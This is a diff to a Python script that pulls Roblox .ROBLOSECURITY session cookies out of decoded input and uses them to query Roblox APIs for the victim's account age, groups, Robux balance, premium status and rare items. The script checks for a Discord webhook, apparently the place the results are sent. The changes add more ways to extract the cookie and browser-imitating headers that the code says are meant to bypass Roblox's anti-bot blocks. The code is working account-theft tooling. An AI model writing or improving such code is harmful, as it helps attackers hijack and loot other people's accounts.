@@ -33,24 +33,33 @@ def main():
             print("DEBUG: DISCORD_WEBHOOK_URL is missing!", file=sys.stderr)
             return
 
-        # Flexible matching: grabs any valid warning header token or fallback alphanumeric block
-        match = re.search(r'(_\|WARNING:[^"\']+)', decoded_script, re.DOTALL)
-        if match:
-            roblosecurity = match.group(1)
-        else:
-            # Fallback if no warning header is present in the raw input string
-            fallback_match = re.search(r'([A-Fa-f0-9]{200,})', decoded_script)
-            if fallback_match:
-                roblosecurity = fallback_match.group(1)
-            else:
-                roblosecurity = decoded_script.strip()
+        # Extract token securely
+        roblosecurity = None
+        patterns = [
+            r'(_\|WARNING:[^"\']+)',
+            r'\.ROBLOSECURITY["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-\.%\|]+)',
+            r'([A-Fa-f0-9]{250,})'
+        ]
+
+        for p in patterns:
+            match = re.search(p, decoded_script, re.DOTALL)
+            if match:
+                roblosecurity = match.group(1)
+                break
+
+        if not roblosecurity:
+            roblosecurity = decoded_script.strip()
 
         roblosecurity = re.sub(r'\s+', '', roblosecurity)
         roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')
 
+        # Hardened headers to bypass Roblox anti-bot 401 blocks
         headers = { 
             "Cookie": f".ROBLOSECURITY={roblosecurity}",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Referer": "https://www.roblox.com/",
+            "Origin": "https://www.roblox.com/",
+            "Accept": "application/json, text/plain, */*"
         }
 
         # 1. Authenticated User Info
@@ -70,6 +79,7 @@ def main():
         owned_groups_count = 0
         group_balance = 0
         is_premium = False
+        account_age_days = 0
 
         if user_data and "id" in user_data:
             username = user_data.get("name", "Unknown")
@@ -78,7 +88,6 @@ def main():
 
             # 2. Account Age
             created_str = safe_get(f"https://users.roblox.com/v1/users/{user_id}", headers, {}).get("created")
-            account_age_days = 0
             if created_str:
                 try:
                     created_dt = datetime.fromisoformat(created_str.replace("Z", "+00:00"))
@@ -112,9 +121,16 @@ def main():
                 for g in created_games:
                     game_visits += g.get("rootPlace", {}).get("visits", 0)
 
-            # 6. Inventory Items
+            # 6. Inventory Items (Korblox & Headless Check)
             has_korblox = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/192/is-owned", headers, False)
             has_headless = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/201/is-owned", headers, False)
+
+            if not has_korblox:
+                k_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/13961116", headers, {})
+                has_korblox = len(k_res.get("data", [])) > 0
+            if not has_headless:
+                h_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/134082579", headers, {})
+                has_headless = len(h_res.get("data", [])) > 0
 
             # 7. Groups
             groups_data = safe_get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles", headers, {}).get("data", [])
@@ -128,8 +144,6 @@ def main():
 
             # 8. Premium
             is_premium = safe_get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", headers, False)
-        else:
-            account_age_days = 0
 
         avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com"
 
